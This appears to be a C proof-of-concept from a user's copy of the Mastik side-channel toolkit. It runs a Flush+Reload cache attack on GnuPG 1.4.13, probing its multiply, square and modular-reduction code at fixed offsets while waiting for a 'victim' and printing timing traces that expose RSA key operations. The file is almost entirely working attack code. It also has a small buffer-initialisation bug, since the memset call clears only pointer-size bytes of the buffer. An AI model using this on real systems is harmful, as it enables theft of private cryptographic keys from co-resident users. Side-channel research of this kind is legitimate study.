/*
 * Copyright 2016 CSIRO
 *
 * This file is part of Mastik.
 *
 * Mastik is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Mastik is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Mastik.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fr.h>
#include <util.h>

#define SAMPLES 100000
#define SLOT	2000
#define THRESHOLD 100

#define MUL_OFFSET 0x8f67d	// mpih-mul.c:85
#define SQR_OFFSET 0x8fc89	// mpih-mul.c:271
#define MOD_OFFSET 0x8ed5c	// mpih-div.c:356


int main(int ac, char **av) {
  fr_t fr = fr_prepare();
  int mul =  fr_monitor(fr, map_offset("/home/ehgus/Downloads/AttackTools/gpg-1.4.13", MUL_OFFSET));
  int sqr = fr_monitor(fr, map_offset("/home/ehgus/Downloads/AttackTools/gpg-1.4.13", SQR_OFFSET));
  int mod = fr_monitor(fr, map_offset("/home/ehgus/Downloads/AttackTools/gpg-1.4.13", MOD_OFFSET));

  uint16_t *res = malloc(SAMPLES * 3 * sizeof(uint16_t));
  memset(res, 1, sizeof(res));
  printf("Waiting for victim's input...\n");
  fr_probe(fr, res);

  int l = fr_repeatedprobe(fr, SAMPLES, res, SLOT, THRESHOLD, 500);
  printf("\ntaken time for each actions\n");
  printf("MUL\t\tSQR\t\tMOD\n");
  for (int i = 0; i < l; i++) 
   printf("%d\t\t%d\t\t%d\n", res[i*3], res[i*3+1], res[i*3+2]);
}
